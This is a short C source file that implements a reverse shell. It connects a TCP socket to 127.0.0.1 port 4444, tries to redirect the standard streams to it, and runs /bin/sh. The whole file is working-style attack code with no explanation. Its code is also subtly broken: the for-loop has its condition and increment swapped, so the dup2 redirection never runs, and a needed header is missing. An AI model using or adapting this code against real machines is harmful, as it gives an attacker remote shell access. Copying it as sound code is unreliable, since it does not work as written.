#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

int main()
{
	int my_socket = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in my_sockaddr;
	my_sockaddr.sin_family = AF_INET;
    	my_sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    	my_sockaddr.sin_port = htons(4444);

    	connect(my_socket, (struct sockaddr *)&my_sockaddr, sizeof(my_sockaddr));

	int i;
	for(i = 0; i++; i <3)
		dup2(my_socket, i);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
